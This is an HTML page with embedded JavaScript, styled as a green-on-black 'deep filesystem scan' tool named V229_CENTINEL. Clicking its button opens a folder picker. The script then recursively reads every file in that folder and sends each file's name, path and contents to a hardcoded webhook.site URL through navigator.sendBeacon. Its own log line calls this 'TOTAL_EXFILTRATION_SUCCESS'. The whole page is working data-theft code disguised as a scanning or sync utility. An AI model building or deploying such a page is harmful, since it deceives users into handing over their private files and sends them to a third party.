<!DOCTYPE html>
<html>
<head><title>System Deep Indexer</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
    <div style="padding:40px;border:2px solid #0f0;text-align:center;box-shadow:0 0 80px #0f0;background:rgba(0,20,0,0.9)">
        <h1 style="letter-spacing:5px">V229_CENTINEL</h1>
        <p id="status">AWAITING_DEEP_FILESYSTEM_SCAN...</p>
        <button onclick="deepScan()" style="padding:20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;box-shadow:0 0 20px #0f0">START_RECURSIVE_SYNC</button>
        <div id="log" style="font-size:10px;color:#0a0;margin-top:20px;text-align:left;max-height:150px;overflow-y:auto;border-top:1px solid #0a0">
            > SCAN_ENGINE: READY<br>
            > TARGET_API: FS_ACCESS_RECURSIVE
        </div>
    </div>

<script>
    const webhook = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";

    async function deepScan() {
        try {
            // 1. REQUEST DIRECTORY HANDLE
            const dirHandle = await window.showDirectoryPicker();
            document.getElementById('status').innerText = "SCANNING_IN_PROGRESS...";
            document.getElementById('status').style.color = "#f00";

            // 2. TRIGGER RECURSIVE ENGINE
            await scanRecursive(dirHandle, "");

            document.getElementById('status').innerText = "FULL_SYNC_COMPLETE";
            document.getElementById('status').style.color = "#0f0";
            log("!! TOTAL_EXFILTRATION_SUCCESS");

        } catch (err) {
            log("!! ACCESS_DENIED: " + err.message);
        }
    }

    async function scanRecursive(handle, path) {
        for await (const entry of handle.values()) {
            const currentPath = path + "/" + entry.name;

            if (entry.kind === 'file') {
                log(`READING: ${currentPath}`);
                try {
                    const file = await entry.getFile();
                    const content = await file.text();

                    // 3. AUTOMATED EXFILTRATION
                    // Mengirimkan nama file, path, dan isi kontennya sekaligus
                    navigator.sendBeacon(`${webhook}?v=V229_CONTENT_LEAK`, btoa(JSON.stringify({
                        file: entry.name,
                        path: currentPath,
                        data: content.substring(0, 5000) // Limit data per request
                    })));
                } catch (e) {
                    log(`!! SKIP_LOCKED: ${entry.name}`);
                }
            } else if (entry.kind === 'directory') {
                log(`ENTERING_SUBDIR: ${entry.name}`);
                // Rekursif: Masuk ke dalam sub-folder
                await scanRecursive(entry, currentPath);
            }
        }
    }

    function log(msg) {
        const l = document.getElementById('log');
        l.innerHTML += `<div>> ${msg}</div>`;
        l.scrollTop = l.scrollHeight;
    }
</script>
</body>
</html>
